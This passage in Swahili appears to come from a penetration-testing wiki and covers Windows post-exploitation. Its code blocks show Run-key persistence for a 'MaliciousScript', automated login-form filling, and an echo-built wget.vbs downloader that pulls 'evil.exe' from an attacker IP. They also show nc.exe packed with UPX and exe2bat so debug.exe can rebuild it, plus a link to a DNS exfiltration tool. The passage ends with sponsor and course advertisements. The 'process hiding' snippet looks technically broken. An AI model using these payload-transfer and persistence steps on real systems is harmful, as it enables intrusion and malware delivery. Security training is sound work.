### Kusoma na Kuandika Usajili

Usajili wa Windows ni sehemu muhimu ya mfumo wa uendeshaji. VBScript inaweza kutumika kusoma na kuandika maingizo ya usajili, ambayo inaweza kuwa na habari muhimu kwa udukuzi.

```vbscript
strComputer = "."
Set objReg = GetObject("winmgmts:\\" & strComputer & "\root\default:StdRegProv")

strKeyPath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
strValueName = "MaliciousScript"
strValue = "C:\path\to\script.vbs"

objReg.CreateKey HKEY_CURRENT_USER, strKeyPath
objReg.SetStringValue HKEY_CURRENT_USER, strKeyPath, strValueName, strValue

strValue = objReg.GetStringValue(HKEY_CURRENT_USER, strKeyPath, strValueName)
```

### Kuficha Mchakato

Kuficha mchakato ni muhimu katika udukuzi ili kuepuka kugunduliwa na zana za usalama. VBScript inaweza kutumika kuficha mchakato kwa kubadilisha sifa zake za kazi.

```vbscript
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='malicious.exe'")

For Each objProcess in colProcesses
    objProcess.Create()
    objProcess.SetPriority(64)
Next
```

### Kufanya Udukuzi wa Mtandao

VBScript inaweza kutumika kufanya udukuzi wa mtandao kwa kutekeleza hatua kama vile kuanzisha uhusiano wa mtandao, kutuma maombi ya HTTP, na kusoma majibu.

```vbscript
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
objHTTP.open "GET", "http://www.example.com", False
objHTTP.send

strResponse = objHTTP.responseText
```

### Kufanya Udukuzi wa Wavuti

VBScript inaweza kutumika kufanya udukuzi wa wavuti kwa kutekeleza hatua kama vile kujaza fomu, kubofya viungo, na kuchanganua maudhui ya wavuti.

```vbscript
Set objIE = CreateObject("InternetExplorer.Application")
objIE.Visible = True
objIE.Navigate "http://www.example.com"

Do While objIE.Busy
    WScript.Sleep 100
Loop

objIE.Document.getElementById("username").Value = "admin"
objIE.Document.getElementById("password").Value = "password"
objIE.Document.getElementById("loginButton").Click
```
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Mlengwa**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

Programu ya `debug.exe` sio tu inaruhusu ukaguzi wa faili za binary lakini pia ina **uwezo wa kuzijenga upya kutoka kwenye hex**. Hii inamaanisha kwamba kwa kutoa hex ya faili ya binary, `debug.exe` inaweza kuzalisha faili ya binary. Hata hivyo, ni muhimu kuzingatia kwamba debug.exe ina **kikomo cha kujenga faili zenye ukubwa wa hadi 64 kb**.
```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```
Kisha nakili na ubandike maandishi kwenye windows-shell na faili iliyoitwa nc.exe itaundwa.

* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Tafuta udhaifu unaofaa zaidi ili uweze kuzirekebisha haraka. Intruder inafuatilia eneo lako la shambulio, inafanya uchunguzi wa vitisho wa kujitokeza, inapata matatizo katika mfumo wako wa teknolojia mzima, kutoka kwa APIs hadi programu za wavuti na mifumo ya wingu. [**Jaribu bure**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) leo.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
